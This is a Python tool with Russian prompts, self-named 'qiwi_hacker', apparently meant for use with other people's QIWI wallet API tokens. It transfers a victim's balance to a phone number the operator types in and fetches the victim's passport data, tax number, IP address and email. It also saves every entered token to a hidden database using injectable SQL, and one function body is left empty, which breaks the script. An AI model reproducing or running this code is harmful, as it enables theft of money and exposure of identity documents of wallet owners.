import os, sys
import time
from time import sleep as timeout

try:import requests
except ImportError:
    print("[ requests ] Модуль не установлен")
    print("    [*] Команда для установки pip install requests")
    sys.exit(1)
try:import SimpleQIWI
except ImportError:
    print("[ SimpleQIWI ] Модуль не установлен")
    print("    [*] Команда для установки pip install SimpleQIWI")
    sys.exit(1)
try:import sqlite3
except:
    print("Модуль [ sqlite3 ] не установлен!")

global db
global sql

db = sqlite3.connect('.database.db')
sql = db.cursor()

sql.execute("""CREATE TABLE IF NOT EXISTS dataQiwi (
    tokenQiwi TEXT
)""")
db.commit()

from SimpleQIWI import *
from requests import api
nu = '\033[0m'
black="\033[1;30m"
re="\033[1;31m"
gr="\033[1;32m"
ye="\033[1;33m"
blue="\033[1;34m"
pu="\033[1;35m"
cy="\033[1;36m"
wh="\033[1;37m"

class extra():
    def write(in_text):
        for char in in_text:
            time.sleep(0.1)
            sys.stdout.write(char)
            sys.stdout.flush()
def reset():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

def save(apiQiwi):
    sql.execute(f"SELECT tokenQiwi FROM dataQiwi WHERE tokenQiwi = '{apiQiwi}'")
    if sql.fetchone() is None:
        sql.execute(f"INSERT INTO dataQiwi VALUES ('{apiQiwi}')")
        db.commit()
    else:
        for i in sql.execute(f"SELECT tokenQiwi FROM dataQiwi"):
            print(i[0])

def information_QIWI_Wallet():
    try:
        token = input("Введите ваш токен: ")

        if token == "":
            print(f"{re}[!]{nu} Введите токен!")
            quit()
        os.system("clear")
        session = requests.Session()
        session.headers['Accept']= 'application/json'
        session.headers['authorization'] = 'Bearer ' + token
        req = session.get("https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true").json()
        print("[🔔] Информация получена")
        api = QApi(token=token, phone="+" + str(req['contractInfo']['contractId']))
        print("Токен клиента: "+ token)
        print("Баланс: "+ str(api.balance[0]))
        print("Номер телефона: +" + str(req['contractInfo']['contractId']) + " (" + req["userInfo"]["operator"] + ")")
        print("Никнейм: qiwi.com/n/" + req['contractInfo']["nickname"]["nickname"])
        print("Дата создания кошелька: " + req['contractInfo']['creationDate'])
        print("IP: " + req["authInfo"]["ip"])
        print("Привязаная почта: " + req["authInfo"]["boundEmail"])
        print("")
        save(token)
    except:
       print("[⚠️] Произошла ошибка")
       print("")
def information_QIWI_Client_passport():
    try:
        token = input("Введите ваш токен: ")

        if token == "":
            print(f"{re}[!]{nu} Введите токен!")
            quit()
        os.system("clear")
        session = requests.Session()
        session.headers['Accept']= 'application/json'
        session.headers['authorization'] = 'Bearer ' + token
        req = session.get("https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true").json()
        req2 = session.get("https://edge.qiwi.com/identification/v1/persons/" + str(req['contractInfo']['contractId']) + "/identification").json()
        print("[🔔] Паспортные данные")
        print("ФИО: " + req2["firstName"] + " " + req2["lastName"])
        print("Дата рождения: " + req2["birthDate"])
        print("Серия и номер: " + req2["passport"])
        print("ИНН: " + req2["inn"])
        print("")
        save(token)
    except:
       print("[⚠️] Произошла ошибка при получении паспортных данных")
       print("")
def info_limit_Qiwi():
    try:
        token = input("Введите токен: ")
        s = requests.Session()
        types = [ 'TURNOVER', 'REFILL', 'PAYMENTS_P2P', 'PAYMENTS_PROVIDER_INTERNATIONALS', 'PAYMENTS_PROVIDER_PAYOUT', 'WITHDRAW_CASH']
        s.headers['Accept']= 'application/json'
        s.headers['Content-Type']= 'application/json'
        s.headers['authorization'] = 'Bearer ' + token
        parameters = {}
        req = s.get("https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true").json()
        login = """+""" + str(req['contractInfo']['contractId']) + """"""
        for i, type in enumerate(types):
            parameters['types[' + str(i) + ']'] = type
        b = s.get('https://edge.qiwi.com/qw-limits/v1/persons/' + login + '/actual-limits', params = parameters).json()
        #print(b["limits"]["RU"][0]["currency"]) #RUB
        withdraw_money = b["limits"]["RU"][0]["spent"]
        limit_withdraw = b["limits"]["RU"][0]["max"]
        yes_withdraw_money = b["limits"]["RU"][0]["rest"]

        max_money = b["limits"]["RU"][2]["max"]
        rest_money = b["limits"]["RU"][2]["rest"]
        spent_money = b["limits"]["RU"][2]["spent"]
        print("""
Расходы c начала месяца:
Потрачено: """+ str(withdraw_money) +"""
Ограничение: """+ str(limit_withdraw) +"""
Можно ещё потратить: """+ str(yes_withdraw_money) +"""

Хранение денег в кошельке:
Максимальное сбережение: """+ str(max_money) +"""
До """+ str(max_money) +""" осталось собрать: """+ str(rest_money) +"""
Данный баланс: """+ str(spent_money) +"""
""")
        save(token)
    except:
        os.system("clear")
        print("Ошибка :(")
def Withdraw_money():
    client_token = input("Введите токен клиента: ")
    os.system("clear")
    if client_token == None:
        quit()
    elif client_token == "":
        quit()
    else:
        exit
    try:
        api_Client = QApi(token=client_token, phone="")
        print('')
        print('Balance: '+ str(api_Client.balance[0]) +' ₽')
        print('')
        print('Внимани для перевода средств должны быть\nвключени все розрешения для api токена.')
        phone = input("Введите свой номер в формате +380: ")
        money = input('Введите сумму: ')
        comment = input('Напишите комментарий (Не обязательно): ')
        api_Client.pay(account=phone, amount=money, comment=comment)
        print('')
        print("""У пользователя осталось: """+ str(api_Client.balance[0]) +"""₽
--------------------
Вы списали с его баланса: """+ str(money) +"""
Переведено на номер: """+ str(phone) +"""
Вы оставили коментарий: """+ str(comment) +"""
""")
        print("")
        save(client_token)
    except:
        print("Произошла неожиданая ошибка!")
        print("""
Причина по которым могла произойти ошибка.
1. Не все розрешение на токене.
2. Возможно токен сменили.
3. Возможно что служба РФ ограничила доступ к QIWI кошельку даже клиенту.
""")
        print("")
def info():

def start():
    version_to_qiwi_hacker = "1.0.7"
    new_information = f"{gr}!Внимание скоро будет обновление.{ye}"
    print(f"{re}VERSION ["+ str(version_to_qiwi_hacker) +f"]{nu}")
    print(f"{re}Telegram chat https://t.me/speak_on_programming{nu}")
    print(f"{re}!Выберите число!{nu}")
    print(f"""{new_information}
{ye}QIWI: {re}[1]{nu} Вывести
{ye}QIWI: {re}[2]{nu} Узнать паспортные данные
{ye}QIWI: {re}[3]{nu} Узнать информацию о QIWI кошельке
{ye}QIWI: {re}[4]{nu} Узнать об ограничениях QIWI кошелька
{ye}QIWI: {re}[5]{nu} Очистить терминал
{ye}QIWI: {re}[6]{nu} Обновить репозиторий
{ye}QIWI: {re}[7]{nu} Остановить операцию
{ye}QIWI: {re}[8] Узнать об обновлении? #Временая функция{nu}
""")
command = True
while command:
    start()
    function_number = input(f"{gr}Введите число:{nu} ")
    if function_number == "8":
        print(f"""{nu}1. {gr}Проверка данных профиля Brawl Stars по тегу.{nu}
        2. {gr}Сохранение паспортных данных.{nu}
        """)
    if function_number == "1":
        Withdraw_money()
    elif function_number == "2":
        information_QIWI_Client_passport()
    elif function_number == "3":
        information_QIWI_Wallet()
    elif function_number == "4":
        info_limit_Qiwi()
    elif function_number == "5":
        os.system("clear")
    elif function_number == "6":
        version = "1.0.7"
        print("Обновление текущая версия " + str(version))
        extra.write(f"{re}[-]{nu}||||||||||||||||||||{gr}[+]{nu}")
        os.system("bash ./.upgrade.sh")
    elif function_number == "7":
        print("Завершение!!!")
        timeout(0.6)
        os.system("clear")
        sys.exit()
    else:
        os.system("clear")
        reset()
